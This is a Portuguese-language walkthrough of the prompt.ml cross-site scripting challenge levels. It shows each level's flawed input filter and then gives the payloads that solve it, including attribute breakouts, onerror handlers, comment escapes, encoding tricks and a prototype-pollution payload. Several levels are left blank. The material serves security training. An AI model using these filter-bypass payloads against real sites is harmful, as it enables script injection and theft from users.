> Autor: @Ralfbp
---
## ✨ Desafio: XSS
> Link desafio: https://prompt.ml/0
> Link material: https://portswigger.net/web-security/cross-site-scripting
------
### Introdução

Os objetivos dos desafios são, inserir uma payload que execute '**prompt(1)**' deve aparecer um prompt no navegador  — sem nenhuma interação do usuário 

Cada nível adiciona uma dificuldade nova e novos caminhos para se chegar no resultado desejado 
ao se completar os desafios o código que aparece em cada desafio, será substituído por  **YOU WON**

![[Tela de resposta correta.png]]

O site possui 16 desafios sendo classificados de `0 a 9` e de `A a F`


---
## Desafios

### desafio 0

<center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0❌.png'></center>
	Codigo
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}
```

	Desafio basico, para mostrar como vão funcionar os desafios, e que exigira uma injeção de HTML ativo executando o prompt(1)
	
[Ir para a resolução do 0º desafio](#0º-desafio)
### desafio 1

![[Atividade_1❌.png]]
	Código 
```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```



[Ir para a resolução do 1º desafio](#1º-desafio)
### desafio 2
![[Atividade_2❌.png]]

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```

[Ir para a resolução do 2º desafio](#2º-desafio)


### desafio 3

![[Atividade_3❌.png]]

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```


[Ir para a resolução do 3º desafio](#3º-desafio)
### desafio 4



[Ir para a resolução do 4º desafio](#4º-desafio)
### desafio 5
![[Atividade_5❌.png]]

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}
```



[Ir para a resolução do 5º desafio](#5º-desafio)
### desafio 6



[Ir para a resolução do 6º desafio](#6º-desafio)
### desafio 7
![[Atividade_7❌.png]]

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```
[Ir para a resolução do 7º desafio](#7º-desafio)
### desafio 8
![[Atividade_8❌.png]]

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}
```


[Ir para a resolução do 8º desafio](#8º-desafio)
### desafio 9



[Ir para a resolução do 9º desafio](#9º-desafio)
### desafio A
![[Atividade_A❌.png]]

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```


[Ir para a resolução do A desafio](#A-desafio)
### desafio B
![[Atividade_B❌.png]]

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}
```

[Ir para a resolução do B desafio](#B-desafio)
### desafio C


![[Atividade_C❌.png]]

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
```

[Ir para a resolução do C desafio](#C-desafio)
### desafio D
![[Atividade_D❌.png]]

```
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```

[Ir para a resolução do D desafio](#D-desafio)
### desafio E



[Ir para a resolução do E desafio](#E-desafio)
### desafio F

![[Atividade_F❌.png]]
```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```


[Ir para a resolução do F desafio](#F-desafio)

---
## 🛠️ Resoluções

### 0º desafio 

![[Atividade_0✅.png]]


```
"><script>prompt(1)</script>
```

* O `input` fecha o atributo `value` ("), abre e fecha a tag `<input>`, Depois vem a tag `<script>` injetada pelo usuário
* Aquele trecho não aparece como texto na página ele é interpretado como um **bloco de código JavaScript real**, que roda no navegador de quem abrir a página.

### 1º desafio 

![[Atividade_1✅.png]]


```
<img src="x" onerror="prompt(1)"
```

### 2º desafio 

![[Atividade_2✅.png]]
```
<svg><script>prompt&#40;1)</script></b>
```

```
HTML source: <svg><script>prompt&#40;1)</script></b>
```
### 3º desafio 

![[Atividade_3✅.png]]


```
--!> <script>prompt(1)</script>
```
### 4º desafio 


### 5º desafio 

![[Atividade_5✅.png]]

```
"type=image src onerror
="prompt(1)
```


### 6º desafio

![[Atividade_6✅.png]]



```
javascript:prompt(1)#{"action":1}
```


### 7º desafio

![[Atividade_7✅.png]]


```
"><svg/a=#"onload='/*#*/prompt(1)'
```


### 8º desafio 
![[Atividade_8✅.png]]
```
 prompt(1) -->
```

### 9º desafio




### A desafio 

![[Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A✅.png]]


```
p'rompt(1)
```


### B desafio 


![[Atividade_B✅.png]]
```
"(prompt(1))in"
```

### C desafio 
![[Atividade_C✅.png]]

```
eval(630038579..toString(30))(1)
```
### D desafio 

![[Atividade_D✅.png]]

```
{"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
```
### E desafio 



### F desafio 
![[Atividade_F✅.png]]
```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
```

---

## ✅ Conclusão
